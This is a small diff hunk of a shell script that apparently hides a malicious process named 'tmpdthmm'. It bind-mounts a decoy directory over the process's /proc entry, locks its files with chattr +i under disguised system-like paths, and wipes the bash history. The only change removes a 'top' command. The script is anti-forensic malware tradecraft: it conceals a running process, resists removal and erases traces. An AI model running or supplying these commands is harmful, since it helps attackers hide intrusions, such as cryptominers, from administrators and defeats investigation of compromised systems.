@@ -40,7 +40,7 @@ mount -o bind /etc/discu /proc/`ps -ef | grep "tmpdthmm" | grep -v grep | awk '{
 chattr +i -RV /etc/systmctl/discpu/tmpdthmm
 
 ps aux | grep tmpdthmm
-top
+
 rm -rf ~/.bash_history
 history -c
 
